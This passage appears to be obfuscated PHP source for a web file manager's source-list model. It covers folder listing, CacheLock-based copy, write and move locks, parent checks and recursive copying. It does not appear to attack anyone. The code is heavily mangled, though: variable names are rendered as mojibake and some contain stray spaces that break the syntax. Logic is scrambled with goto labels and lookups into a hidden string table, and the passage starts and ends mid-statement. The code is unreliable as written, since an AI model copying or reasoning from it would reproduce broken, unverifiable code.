$bøƒ©ØÇ °[$Fª‘Òöñ«£] : !1; if (isset($D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]]) && $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]][$eéøÆ»æ×[478]]) { $eé©ŒÚª¡ = $GLOBALS[$eéøÆ»æ×[6]][$eéøÆ»æ×[84]][$eéøÆ»æ×[479]]; if ($D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]][$eéøÆ»æ×[480]] <= time() - $eé©ŒÚª¡) { $this->metaSet($D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[369]], $eéøÆ»æ×[478], null); $this->metaSet($D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[369]], $eéøÆ»æ×[480], null); unset($D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]][$eéøÆ»æ×[478]]); continue; } $eïÎìÀæ = $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]][$eéøÆ»æ×[478]]; $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[417]][$eéøÆ»æ×[481]] = Model($eéøÆ»æ×[477])->getInfoSimpleOuter($eïÎìÀæ); } } } public function parentLevelArray($FÍ›õÂó­ç) { $dÛ°¶¦££ =& $_SERVER[”Ì÷ñ­î¸]; $FÍ›õÂó­ç = explode($dÛ°¶¦££[47], trim($FÍ›õÂó­ç, $dÛ°¶¦££[47])); return array_remove_value($FÍ›õÂó­ç, $dÛ°¶¦££[468]); } public function listAll($d¾ƒ¯Ÿ¦âØ) { goto A¹ÓĞ‰ì; A¹ÓĞ‰ì: $aà‘ğ÷‰ç =& $_SERVER[”Ì÷ñ­î¸]; $dèÍ‹Ø°…÷ = $this->sourceInfo($d¾ƒ¯Ÿ¦âØ); $aãèËùİì = array($aà‘ğ÷‰ç[482] => array($aà‘ğ÷‰ç[483], $dèÍ‹Ø°…÷[$aà‘ğ÷‰ç[459]] . $d¾ƒ¯Ÿ¦âØ . $aà‘ğ÷‰ç[484]), $aà‘ğ÷‰ç[485] => 0); goto CİÓÈÙ­»Î; CİÓÈÙ­»Î: $E¢´™…’‡‹ = $aà‘ğ÷‰ç[486]; $d½ÜÙïÔˆÓ = "\114\105\x46\124\40\112\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\146\x69\x6c\x65\40\146\151\x6c\145\40\157\x6e\x20\163\x6f\165\x72\143\145\x2e\146\151\154\145\x49\x44\x20\x3d\x20\146\x69\x6c\x65\56\x66\x69\x6c\145\x49\104"; $eÀ©˜áÛĞÃ = $this->alias($aà‘ğ÷‰ç[487])->field($E¢´™…’‡‹)->where($aãèËùİì)->join($d½ÜÙïÔˆÓ)->select(); goto eÈÆ†ê…Å°; Eºî”š‹ÇÏ: $aÇ‘Ùßãªˆ = array(); foreach ($eÀ©˜áÛĞÃ as $BÔŞµˆ™®„ => $c´çà­«Ò) { goto Aò¶‘‰Ú°ˆ; Aò¶‘‰Ú°ˆ: $a´öÕ¥À’™ = $this->parentLevelArray($c´çà­«Ò[$aà‘ğ÷‰ç[459]]); array_shift($a´öÕ¥À’™); $E®ñ‘—µ£ = $Aİ¿³‚‚; goto E¦¼ï—Ñ‘ò; E¦¼ï—Ñ‘ò: for ($fé¦áÊÜğò = 0; $fé¦áÊÜğò < count($a´öÕ¥À’™); $fé¦áÊÜğò++) { $E®ñ‘—µ£ .= $eÀ©˜áÛĞÃ[$a´öÕ¥À’™[$fé¦áÊÜğò]][$aà‘ğ÷‰ç[28]] . $aà‘ğ÷‰ç[8]; } $E®ñ‘—µ£ .= $c´çà­«Ò[$aà‘ğ÷‰ç[28]]; if ($c´çà­«Ò[$aà‘ğ÷‰ç[370]]) { $E®ñ‘—µ£ .= $aà‘ğ÷‰ç[8]; } goto eÌ¢­´Ëö×; eÌ¢­´Ëö×: $E®ñ‘—µ£ = str_replace($aà‘ğ÷‰ç[467], $aà‘ğ÷‰ç[8], $E®ñ‘—µ£); $E®ñ‘—µ£ = str_replace($aà‘ğ÷‰ç[467], $aà‘ğ÷‰ç[8], $E®ñ‘—µ£); $eÍ¿øÕÏ„ˆ = array($aà‘ğ÷‰ç[387] => str_replace($aà‘ğ÷‰ç[467], $aà‘ğ÷‰ç[8], $E®ñ‘—µ£), $aà‘ğ÷‰ç[488] => intval($c´çà­«Ò[$aà‘ğ÷‰ç[370]]), $aà‘ğ÷‰ç[391] => $this->pathInfoFilter($c´çà­«Ò, !0)); goto CÔšŞÅ³¯; CÔšŞÅ³¯: if (!$c´çà­«Ò[$aà‘ğ÷‰ç[370]]) { $eÍ¿øÕÏ„ˆ[$aà‘ğ÷‰ç[419]] = $c´çà­«Ò[$aà‘ğ÷‰ç[419]]; $eÍ¿øÕÏ„ˆ[$aà‘ğ÷‰ç[489]] = $c´çà­«Ò[$aà‘ğ÷‰ç[75]]; } $aÇ‘Ùßãªˆ[] = $eÍ¿øÕÏ„ˆ; goto aëÑ«‰Ü’¢; aëÑ«‰Ü’¢: } return $aÇ‘Ùßãªˆ; goto f¹„‰‚Å; DÄŒÒáÖèÜ: $eÀ©˜áÛĞÃ = array_to_keyvalue($eÀ©˜áÛĞÃ, $aà‘ğ÷‰ç[369]); $Aİ¿³‚‚ = "\x2f{$dèÍ‹Ø°…÷[$aà‘ğ÷‰ç[28]]}\x2f"; $Aİ¿³‚‚ = $Aİ¿³‚‚ == $aà‘ğ÷‰ç[467] ? $aà‘ğ÷‰ç[8] : $Aİ¿³‚‚; goto Eºî”š‹ÇÏ; eÈÆ†ê…Å°: $this->_listAppendAuth($eÀ©˜áÛĞÃ); $this->_listAppendUser($eÀ©˜áÛĞÃ); $this->_listAppendPath($eÀ©˜áÛĞÃ); goto DÄŒÒáÖèÜ; f¹„‰‚Å: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($D²Šô¬”¼) { goto dÜ—Ãíá©‰; A½ ‡ÆÄÄ: $this->_lockEvent($D²Šô¬”¼, array($AÄŒÒ×Ñ‹¾[493], $AÄŒÒ×Ñ‹¾[494]), $bÜ®âë ä); $this->_lockCheckEnd($AÄŒÒ×Ñ‹¾[490], $D²Šô¬”¼); goto B­ØŠˆÃ·Ÿ; aì®ÖŞƒĞ: $bÜ®âë ä = 1; $this->_lockEvent($D²Šô¬”¼, array($AÄŒÒ×Ñ‹¾[491], $AÄŒÒ×Ñ‹¾[492]), $bÜ®âë ä); $this->_lockParent($D²Šô¬”¼, array($AÄŒÒ×Ñ‹¾[492]), $bÜ®âë ä); goto A½ ‡ÆÄÄ; dÜ—Ãíá©‰: $AÄŒÒ×Ñ‹¾ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÄŒÒ×Ñ‹¾[490], $D²Šô¬”¼); goto aì®ÖŞƒĞ; B­ØŠˆÃ·Ÿ: } public function lockCopyEnd($c™Ãåôø¥) { $a¾ÓòÖíÍñ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $a“İŞÅæó = 0; $this->_lockEvent($c™Ãåôø¥, array($a¾ÓòÖíÍñ[491], $a¾ÓòÖíÍñ[492]), $a“İŞÅæó); $this->_lockParent($c™Ãåôø¥, array($a¾ÓòÖíÍñ[492]), $a“İŞÅæó); $this->_lockEvent($c™Ãåôø¥, array($a¾ÓòÖíÍñ[493], $a¾ÓòÖíÍñ[494]), $a“İŞÅæó); } public function lockWriteStart($c‡× õòƒ, $FÉ°æïØë = '') { goto BåàÄêÕì·; FÃåø¼äÙ: $Føô¹ß Ìé = 1; $this->_lockKey($a„ŞèÖÉ×[495] . $c‡× õòƒ . $a„ŞèÖÉ×[91] . $FÉ°æïØë, $Føô¹ß Ìé); $this->_lockEvent($c‡× õòƒ, array($a„ŞèÖÉ×[490], $a„ŞèÖÉ×[492]), $Føô¹ß Ìé); goto f×õ·ñˆä§; f×õ·ñˆä§: $this->_lockParent($c‡× õòƒ, array($a„ŞèÖÉ×[490], $a„ŞèÖÉ×[492]), $Føô¹ß Ìé); $this->_lockCheckEnd($a„ŞèÖÉ×[491], $c‡× õòƒ); goto AÊî“âœƒÏ; BåàÄêÕì·: $a„ŞèÖÉ× =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($a„ŞèÖÉ×[491], $c‡× õòƒ); goto FÃåø¼äÙ; AÊî“âœƒÏ: } public function lockWriteEnd($C§ÇÁ»‚Ú¶, $D–·ËÍÓòÇ = '') { $e™±ò°ŠÏÃ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $E„âÉÒğ = 0; $this->_lockKey($e™±ò°ŠÏÃ[495] . $C§ÇÁ»‚Ú¶ . $e™±ò°ŠÏÃ[91] . $D–·ËÍÓòÇ, $E„âÉÒğ); $this->_lockEvent($C§ÇÁ»‚Ú¶, array($e™±ò°ŠÏÃ[490], $e™±ò°ŠÏÃ[492]), $E„âÉÒğ); $this->_lockParent($C§ÇÁ»‚Ú¶, array($e™±ò°ŠÏÃ[490], $e™±ò°ŠÏÃ[492]), $E„âÉÒğ); } public function lockMoveStart($Eƒª¸…îØ) { goto AŠÌ±ˆ±øê; DæˆîÕÄˆ: $Bªéì¾Ë·İ = 1; $this->_lockKey($D–ƒğÖ›‹[496] . $Eƒª¸…îØ, $Bªéì¾Ë·İ); $this->_lockEvent($Eƒª¸…îØ, array($D–ƒğÖ›‹[490], $D–ƒğÖ›‹[491]), $Bªéì¾Ë·İ); goto f˜‹²ÊÆáÂ; f˜‹²ÊÆáÂ: $this->_lockParent($Eƒª¸…îØ, array($D–ƒğÖ›‹[490], $D–ƒğÖ›‹[492]), $Bªéì¾Ë·İ); $this->_lockEvent($Eƒª¸…îØ, array($D–ƒğÖ›‹[497], $D–ƒğÖ›‹[493], $D–ƒğÖ›‹[494]), $Bªéì¾Ë·İ); $this->_lockCheckEnd($D–ƒğÖ›‹[492], $Eƒª¸…îØ); goto Cß²Ì’¿ÜÚ; AŠÌ±ˆ±øê: $D–ƒğÖ›‹ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $this->_lockCheck($D–ƒğÖ›‹[492], $Eƒª¸…îØ); goto DæˆîÕÄˆ; Cß²Ì’¿ÜÚ: } public function lockMoveEnd($DÑ¿Ç‡Úç) { goto F¢äñÅ¶¨; Fù‡º¤£Ÿ: $this->_lockKey($dí¸ª¤ó÷ß[496] . $DÑ¿Ç‡Úç, $Fä‚§ÓµøÒ); $this->_lockEvent($DÑ¿Ç‡Úç, array($dí¸ª¤ó÷ß[490], $dí¸ª¤ó÷ß[491]), $Fä‚§ÓµøÒ); $this->_lockParent($DÑ¿Ç‡Úç, array($dí¸ª¤ó÷ß[490], $dí¸ª¤ó÷ß[492]), $Fä‚§ÓµøÒ); goto b Ñ¿ö·Çß; F¢äñÅ¶¨: $dí¸ª¤ó÷ß =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->allowLock()) { return; } $Fä‚§ÓµøÒ = 0; goto Fù‡º¤£Ÿ; b Ñ¿ö·Çß: $this->_lockEvent($DÑ¿Ç‡Úç, array($dí¸ª¤ó÷ß[497], $dí¸ª¤ó÷ß[493], $dí¸ª¤ó÷ß[494]), $Fä‚§ÓµøÒ); goto c—éÔ¹®; c—éÔ¹®: } private function _lockCheck($CÀ²ë„…, $d’İÂˆåÖ) { goto ağ·ª¼²Íó; B‹§¦Ñ „À: $Cñï‹ã³Ğó = array_reverse($this->parentLevelArray($FçèŠÈ¶ŒÁ[$AÎâ¿«Š¥…[459]])); foreach ($Cñï‹ã³Ğó as $e£ Ñƒ®ê) { $f×Ï¡íœÄ  = $CÀ²ë„… . $AÎâ¿«Š¥…[499] . $e£ Ñƒ®ê; if (CacheLock::lockGet($AÎâ¿«Š¥…[500] . $f×Ï¡íœÄ )) { $FçèŠÈ¶ŒÁ = $this->sourceInfo($e£ Ñƒ®ê); CacheLock::setErrorMsg($AÎâ¿«Š¥…[157] . htmlspecialchars($FçèŠÈ¶ŒÁ[$AÎâ¿«Š¥…[28]]) . $AÎâ¿«Š¥…[476] . $eÖ¬†˜¨ˆ); $this->_lockKey($f×Ï¡íœÄ , 1); $this->_lockKey($f×Ï¡íœÄ , 0); } } goto dƒ´Ç·ïÓ¹; dÛªÄåâ×Ö: CacheLock::setErrorMsg($AÎâ¿«Š¥…[157] . htmlspecialchars($FçèŠÈ¶ŒÁ[$AÎâ¿«Š¥…[28]]) . $AÎâ¿«Š¥…[476] . $eÖ¬†˜¨ˆ); $this->_lockKey($f×Ï¡íœÄ , 1); $this->_lockKey($f×Ï¡íœÄ , 0); goto B‹§¦Ñ „À; d›Š‚áÛØó: $this->_lockTimeStart[$f×Ï¡íœÄ ] = timeFloat(); if (!is_array($FçèŠÈ¶ŒÁ)) { return; } $eÖ¬†˜¨ˆ = LNG($AÎâ¿«Š¥…[498]); goto dÛªÄåâ×Ö; ağ·ª¼²Íó: $AÎâ¿«Š¥… =& $_SERVER[”Ì÷ñ­î¸]; $FçèŠÈ¶ŒÁ = $this->sourceInfo($d’İÂˆåÖ); $f×Ï¡íœÄ  = $CÀ²ë„… . $AÎâ¿«Š¥…[91] . $d’İÂˆåÖ; goto d›Š‚áÛØó; dƒ´Ç·ïÓ¹: } private function _lockCheckEnd($BÏ¨ˆğÏô, $E˜ÕÜ±Ô…²) { goto F›¢ìƒ®; c‹§ÖÆÍ¹º: if ($fÌñ÷†¥¿ > 0.5) { unset(self::$cacheSourceInfo[$FÎë ›Ì÷÷[410] . $E˜ÕÜ±Ô…²]); } $dŞˆµ© = $this->sourceInfo($E˜ÕÜ±Ô…²); if (!$dŞˆµ©) { show_json(LNG($FÎë ›Ì÷÷[101]), !1); } goto D‘Æø¢•Ó; F›¢ìƒ®: $FÎë ›Ì÷÷ =& $_SERVER[”Ì÷ñ­î¸]; $DËÚµ¢›ĞŒ = $BÏ¨ˆğÏô . $FÎë ›Ì÷÷[91] . $E˜ÕÜ±Ô…²; CacheLock::setErrorMsg($FÎë ›Ì÷÷[361]); goto aİí® ª×œ; aİí® ª×œ: if (!isset($this->_lockTimeStart[$DËÚµ¢›ĞŒ])) { return; } $fÌñ÷†¥¿ = timeFloat() - $this->_lockTimeStart[$DËÚµ¢›ĞŒ]; unset($this->_lockTimeStart[$DËÚµ¢›ĞŒ]); goto c‹§ÖÆÍ¹º; D‘Æø¢•Ó: } private function _lockParent($BÕ¾§Ôò•À, $bØ¦ôÍÜï, $Dêâ©ÑôŠÁ) { if (!$this->autoLockSet) { return; } $bçâ×­’³Š = $this->sourceInfo($BÕ¾§Ôò•À); if (!is_array($bçâ×­’³Š)) { return; } $CÁ·¿ùÙ„ = array_reverse($this->parentLevelArray($bçâ×­’³Š[$_SERVER[”Ì÷ñ­î¸][459]])); foreach ($CÁ·¿ùÙ„ as $eÉÄ³ôñÁÜ) { $this->_lockEvent($eÉÄ³ôñÁÜ, $bØ¦ôÍÜï, $Dêâ©ÑôŠÁ); } } private function _lockEvent($aĞßÍùÜŠå, $EøßØ´Ñ†¯, $FÌœÆ£Ğ¼›) { $D¿ìÉï®›‹ =& $_SERVER[”Ì÷ñ­î¸]; if (!$this->autoLockSet) { return; } foreach ($EøßØ´Ñ†¯ as $Bİ‹ÓšØŸÎ) { $DéÊøìÍô’ = $Bİ‹ÓšØŸÎ . $D¿ìÉï®›‹[91] . $aĞßÍùÜŠå; if ($FÌœÆ£Ğ¼› && CacheLock::lockGet($D¿ìÉï®›‹[500] . $DéÊøìÍô’)) { continue; } $this->_lockKey($DéÊøìÍô’, $FÌœÆ£Ğ¼›); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($DŠİİñè¡Ö, $AâÀÁŞ†øî = 1) { $D™ÆËÌõ§¼ = $_SERVER[”Ì÷ñ­î¸][500] . md5($DŠİİñè¡Ö); if ($AâÀÁŞ†øî) { if (isset(self::$_lockItemArr[$D™ÆËÌõ§¼])) { return; } self::$_lockItemArr[$D™ÆËÌõ§¼] = 1; CacheLock::lock($D™ÆËÌõ§¼, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$D™ÆËÌõ§¼])) { return; } unset(self::$_lockItemArr[$D™ÆËÌõ§¼]); CacheLock::unlock($D™ÆËÌõ§¼); } } public function isParentOf($Cğ«ä‘öØİ, $B´îÏïšÁ) { goto Eêš†”¨éœ; Eêš†”¨éœ: $aæÚ­ÔîÑó =& $_SERVER[”Ì÷ñ­î¸]; $a©ãõ§ä° = $this->sourceInfo($Cğ«ä‘öØİ); $bÑá÷ŠÖ…Ê = $this->sourceInfo($B´îÏïšÁ); goto dõÜ»´é; dõÜ»´é: $aîğÂœ© = $a©ãõ§ä°[$aæÚ­ÔîÑó[459]] . $a©ãõ§ä°[$aæÚ­ÔîÑó[369]] . $aæÚ­ÔîÑó[47]; $aŒùØ¢Ü± = $bÑá÷ŠÖ…Ê[$aæÚ­ÔîÑó[459]] . $bÑá÷ŠÖ…Ê[$aæÚ­ÔîÑó[369]] . $aæÚ­ÔîÑó[47]; $c™¨”°ª‚ò = strpos($aŒùØ¢Ü±, $aîğÂœ©) === 0; goto AËÖö×‡—Ë; AËÖö×‡—Ë: return $c™¨”°ª‚ò; goto cÍíòÑÛâ‡; cÍíòÑÛâ‡: } private $targetIsDelete = 0; public function copy($D×ªŸƒ»Î°, $Dâ„Íï­½, $aˆ¯‰·œ = REPEAT_REPLACE, $cĞ§Ë‘ÂŞ‡ = '') { goto e·îº¡ë…î; EÍÄ²õìôß: $this->saveAll($C ²”˜Í°“[$a¶Ğå„Ç”‰[503]]); Model($a¶Ğå„Ç”‰[167])->linkAdd($C ²”˜Í°“[$a¶Ğå„Ç”‰[501]]); $this->folderSizeReset($Dâ„Íï­½); goto eæÙ„Â®Ç; AïèÌªï§: if ($a£‡êÈ‘¬ó[$a¶Ğå„Ç”‰[370]] == $a¶Ğå„Ç”‰[83] && $E«¸ã¿…¾… == $dä«‚­œ‚) { $this->folderSizeResetChildren($E«¸ã¿…¾…); } Model($a¶Ğå„Ç”‰[504])->addAll($C ²”˜Í°“[$a¶Ğå„Ç”‰[502]], array(), !0); if ($E«¸ã¿…¾… != $dä«‚­œ‚ || $a£‡êÈ‘¬ó[$a¶Ğå„Ç”‰[370]] == $a¶Ğå„Ç”‰[83]) { Model($a¶Ğå„Ç”‰[505])->eventCopy($dä«‚­œ‚); } goto EÍÄ²õìôß; e·îº¡ë…î: $a¶Ğå„Ç”‰ =& $_SERVER[”Ì÷ñ­î¸]; $a£‡êÈ‘¬ó = $this->sourceInfo($D×ªŸƒ»Î°); $CÇŠ„ÇÄÇ = $this->sourceInfo($Dâ„Íï­½); goto cÚ®’…‚š–; BõÔğæ×”…: $this->lockCopyStart($D×ªŸƒ»Î°); $this->lockWriteStart($Dâ„Íï­½, $E¦Ğ á³Ğ); $C ²”˜Í°“ = array($a¶Ğå„Ç”‰[501] => array(), $a¶Ğå„Ç”‰[502] => array(), $a¶Ğå„Ç”‰[503] => array()); goto d¿öÁÃ¦‚¯; cÚ®’…‚š–: if (!$a£‡êÈ‘¬ó || !$CÇŠ„ÇÄÇ || $CÇŠ„ÇÄÇ[$a¶Ğå„Ç”‰[370]] != $a¶Ğå„Ç”‰[83]) { return !1; } if ($this->isParentOf($D×ªŸƒ»Î°, $Dâ„Íï­½)) { return !1; } $E¦Ğ á³Ğ = $cĞ§Ë‘ÂŞ‡ ? $cĞ§Ë‘ÂŞ‡ : $a£‡êÈ‘¬ó[$a¶Ğå„Ç”‰[28]]; goto BõÔğæ×”…; d¿öÁÃ¦‚¯: $this->targetIsDelete = intval($a£‡êÈ‘¬ó[$a¶Ğå„Ç”‰[397]]); $E«¸ã¿…¾… = $this->fileNameExistCache($Dâ„Íï­½, $a£‡êÈ‘¬ó[$a¶Ğå„Ç”‰[28]]); $dä«‚­œ‚ = $this->_copy($D×ªŸƒ»Î°, $Dâ„Íï­½, $aˆ¯‰·œ, $C ²”˜Í°“, !0, $cĞ§Ë‘ÂŞ‡); goto D²ĞÚíÚİí; D²ĞÚíÚİí: $this->_childrenListClear(); $this->lockCopyEnd($D×ªŸƒ»Î°); $this->lockWriteEnd($Dâ„Íï­½, $E¦Ğ á³Ğ); goto AïèÌªï§; eæÙ„Â®Ç: $this->updateModifyTime($Dâ„Íï­½); return $dä«‚­œ‚; goto b‹²½î‹ì¹; b‹²½î‹ì¹: } private function _copy($DÇÍ·áªÚÔ, $aíí–×åâÖ, $b»Ôàõ×òº, &$F±™½Çº·ˆ, $aÍ¿°°¢´‘, $EÃÌ†äÆç× = '') { goto eéíÈÂ¸‹ß; BëÔÕ„ôêÏ: if (!$bÈ™ÎîÖ) { return $this->_copyCreate($DÇÍ·áªÚÔ, $aíí–×åâÖ, $Bù ÆµÍµ, $F±™½Çº·ˆ); } $cÙÙê±·Š³ = $bÈ™ÎîÖ; if ($AÓÃÚéì¦ˆ) { if ($b»Ôàõ×òº == REPEAT_RENAME_FOLDER) { $Bù ÆµÍµ = $this->fileNameAutoCache($aíí–×åâÖ, $Bù ÆµÍµ, $b»Ôàõ×òº, $AÓÃÚéì¦ˆ); $cÙÙê±·Š³ = $this->_copyCreate($DÇÍ·áªÚÔ, $aíí–×åâÖ, $Bù ÆµÍµ, $F±™½Çº·ˆ); } else { $FçÈ¼’Ï†Ú = $this->_childrenList($DÇÍ·áªÚÔ); foreach ($FçÈ¼’Ï†Ú as $dÉèºÁçáÖ) { $this->_copy($dÉèºÁçáÖ[$eÉ÷„ƒçİ¾[369]], $bÈ™ÎîÖ, $b»Ôàõ×òº, $F±™½Çº·ˆ, !1); } } } else { if ($b»Ôàõ×òº == REPEAT_RENAME || $b»Ôàõ×òº == REPEAT_RENAME_FOLDER) { $Bù ÆµÍµ = $this->fileNameAutoCache($aíí–×åâÖ, $Bù ÆµÍµ, $b»Ôàõ×òº, $AÓÃÚéì¦ˆ); $cÙÙê±·Š³ = $this->_copyCreate($DÇÍ·áªÚÔ, $aíí–×åâÖ, $Bù ÆµÍµ, $F±™½Çº·ˆ); } else { if ($b»Ôàõ×òº == REPEAT_REPLACE) { $AŞ›Îëª¥ğ = $this->sourceInfoCache($bÈ™ÎîÖ); $d„¯Ğ±ä´ = $this->fileHistory($AŞ›Îëª¥ğ, $e¹½ĞÙ¶šÖ[$eÉ÷„ƒçİ¾[419]], $e¹½ĞÙ¶šÖ[$eÉ÷„ƒçİ¾[77]]); if ($d„¯Ğ±ä´) { $F±™½Çº·ˆ[$eÉ÷„ƒçİ¾[501]][] = $e¹½ĞÙ¶šÖ[$eÉ÷„ƒçİ¾[419]]; } } else { if ($b»Ôàõ×òº == REPEAT_SKIP) { } } } Hook::trigger($eÉ÷„ƒçİ¾[506], array($eÉ÷„ƒçİ¾[507], $e¹½ĞÙ¶šÖ, 0)); } goto dµ®®ÆÏ¾¬; f³Î¢ š±: $Bù ÆµÍµ = $EÃÌ†äÆç× ? $EÃÌ†äÆç× : $e¹½ĞÙ¶šÖ[$eÉ÷„ƒçİ¾[28]]; $bÈ™ÎîÖ = $this->fileNameExistCache($aíí–×åâÖ, $Bù ÆµÍµ); if ($aÍ¿°°¢´‘) { $this->_childrenAllMake($DÇÍ·áªÚÔ); if ($AÓÃÚéì¦ˆ && $bÈ™ÎîÖ) { $this->_childrenAllMake($bÈ™ÎîÖ); } } goto BëÔÕ„ôêÏ; dµ®®ÆÏ¾¬: return $cÙÙê±·Š³; goto eÄÌ»­°™; eéíÈÂ¸‹ß: $eÉ÷„ƒçİ¾ =& $_SERVER[”Ì÷ñ­î¸]; $e¹½ĞÙ¶šÖ = $this->sourceInfoCache($DÇÍ·áªÚÔ); $AÓÃÚéì¦ˆ = $e¹½ĞÙ¶šÖ[$eÉ÷„ƒçİ¾[370]] == $eÉ÷„ƒçİ¾[83]; goto f³Î¢ š±; eÄÌ»­°™: } private function _copyCreate($dÆö·“ßÇ, $CÍ„ØÊ‚«, $b¢Û‹Ç˜¬, &$fÜ˜¬‡ñãŸ) { goto bï˜µîíŒ; BÚéù”´æÔ: $this->chunkEventSet($Eã¾Ëä¢¾[515], array($Eã¾Ëä¢¾[516], $dÛ¼Ş¤Ü¾, $cÑ„ÛáÊš—)); $this->saveAll($fÔËÅÄø«™); return $a¢—ã† Ş; goto a©³îò’¹™; a÷›Œ‹‘…õ: if ($cÓß“¿†™ [$Eã¾Ëä¢¾[370]] != $Eã¾Ëä¢¾[83]) { $fÜ˜¬‡ñãŸ[$Eã¾Ëä¢¾[501]][] = $cÓß“¿†™ [$Eã¾Ëä¢¾[419]]; return $a¢—ã† Ş; } $dô³Ñë«¥É = array(); $b§ÆÔîˆ’ = array(); goto A¿Ëµ¼£¿; D£Óñ ã®: $this->addAll($b§ÆÔîˆ’, array(), !1); $bŞô›ŒÚãØ = $this->where(array($Eã¾Ëä¢¾[461] => $a¢—ã† Ş))->select(); $dºÁ¬ÅÃÔ» = $this->_childrenMakeRelation($dô³Ñë«¥É, $bŞô›ŒÚãØ); goto F¿°‚è¤ìò; bï˜µîíŒ: $Eã¾Ëä¢¾ =& $_SERVER[”Ì÷ñ­î¸]; $cÓß“¿†™  = $this->sourceInfoCache($dÆö·“ßÇ); $cË¤Ş‘ƒø¼ = $this->sourceInfoCache($CÍ„ØÊ‚«); goto cĞ‘Å¨÷á³; e×ÀŠÏ¥¸: foreach ($bŞô›ŒÚãØ as $EÃ£š®À‘¹) { $fÄƒ–Ú¬½Ô = $EÃ£š®À‘¹[$Eã¾Ëä¢¾[369]]; $c¶•“Ï£¾Í = $this->_childrenMatch($dºÁ¬ÅÃÔ», $EÃ£š®À‘¹, $f­ï·Ç‚ŞÈ); $F‰ÔŠÈô¸[] = array($Eã¾Ëä¢¾[369], $fÄƒ–Ú¬½Ô, $Eã¾Ëä¢¾[461], $c¶•“Ï£¾Í[$Eã¾Ëä¢¾[461]]); $fÔËÅÄø«™[] = array($Eã¾Ëä¢¾[369], $fÄƒ–Ú¬½Ô, $Eã¾Ëä¢¾[459], $c¶•“Ï£¾Í[$Eã¾Ëä¢¾[459]]); $this->_copyApplyMeta($EÃ£š®À‘¹, $fÜ˜¬‡ñãŸ); if ($EÃ£š®À‘¹[$Eã¾Ëä¢¾[370]] != $Eã¾Ëä¢¾[83]) { $fÜ˜¬‡ñãŸ[$Eã¾Ëä¢¾[501]][] = $EÃ£š®À‘¹[$Eã¾Ëä¢¾[419]]; } } $this->chunkEventSet($Eã¾Ëä¢¾[513], array($Eã¾Ëä¢¾[514], $dÛ¼Ş¤Ü¾, $cÑ„ÛáÊš—)); $this->saveAll($F‰ÔŠÈô¸); goto BÚéù”´æÔ; cĞ‘Å¨÷á³: $dÛ¼Ş¤Ü¾ = $this->_makeItemData($cÓß“¿†™ , $cË¤Ş‘ƒø¼, $b¢Û‹Ç˜¬); Hook::trigger($Eã¾Ëä¢¾[508], $dÛ¼Ş¤Ü¾); Hook::trigger($Eã¾Ëä¢¾[509], array($Eã¾Ëä¢¾[510], $dÛ¼Ş¤Ü¾, 0)); goto Fåš¥¾ç; F¿°‚è¤ìò: $dºÁ¬ÅÃÔ»[$dÆö·“ßÇ] = $a¢—ã† Ş; $F‰ÔŠÈô¸ = array(); $fÔËÅÄø«™ = array(); goto e×ÀŠÏ¥¸; A¿Ëµ¼£¿: $this->_childrenListAll($dÆö·“ßÇ, $dô³Ñë«¥É); $cÑ„ÛáÊš— = count($dô³Ñë«¥É); if ($cÑ„ÛáÊš— == 0) { return $a¢—ã† Ş; } goto BÏ—é‘—¿; BÏ—é‘—¿: $f­ï·Ç‚ŞÈ = $this->sourceInfo($a¢—ã† Ş); foreach ($dô³Ñë«¥É as $EÃ£š®À‘¹) { $A¸ê¡Ê°ñê = $this->_makeItemData($EÃ£š®À‘¹, $f­ï·Ç‚ŞÈ, $EÃ£š®À‘¹[$Eã¾Ëä¢¾[28]]); $A¸ê¡Ê°ñê[$Eã¾Ëä¢¾[459]] = $EÃ£š®À‘¹[$Eã¾Ëä¢¾[459]]; $b§ÆÔîˆ’[] = $A¸ê¡Ê°ñê; } $this->chunkEventSet($Eã¾Ëä¢¾[511], array($Eã¾Ëä¢¾[512], $dÛ¼Ş¤Ü¾, $cÑ„ÛáÊš—)); goto D£Óñ ã®; Fåš¥¾ç: $a¢—ã† Ş = $this->add($dÛ¼Ş¤Ü¾); $DÊÜ¸Ù«áÆ = array($Eã¾Ëä¢¾[369] => $a¢—ã† Ş, $Eã¾Ëä¢¾[28] => $b¢Û‹Ç˜¬); $this->_copyApplyMeta($DÊÜ¸Ù«áÆ, $fÜ˜¬‡ñãŸ); goto a÷›Œ‹‘…õ; a©³îò’¹™: } private function _childrenMakeRelation($a†š¦ŞŸÂÈ, $aâÇˆß„Ÿ…) { $C×ÍÏŸ”å =& $_SERVER[”Ì÷ñ­î¸]; $B±ìÑï­Ÿ£ = array(); $Aƒ¤¨÷Í = array(); foreach ($a†š¦ŞŸÂÈ as $C¼Ï–Û¸¦) { $cê¾¸À§éÅ = $C¼Ï–Û¸¦[$C×ÍÏŸ”å[28]] . $C×ÍÏŸ”å[8] . $C¼Ï–Û¸¦[$C×ÍÏŸ”å[459]]; $B±ìÑï­Ÿ£[$cê¾¸À§éÅ] = $C¼Ï–Û¸¦[$C×ÍÏŸ”å[369]]; } foreach ($aâÇˆß„Ÿ… as $C¼Ï–Û¸¦) { $cê¾¸À§éÅ = $C¼Ï–Û¸¦[$C×ÍÏŸ”å[28]] . $C×ÍÏŸ”å[8] . $C¼Ï–Û¸¦[$C×ÍÏŸ”å[459]]; $A„ª¬äÀ¿º = $B±ìÑï­Ÿ£[$cê¾¸À§éÅ]; $Aƒ¤¨÷Í[$A„ª¬äÀ¿º] = 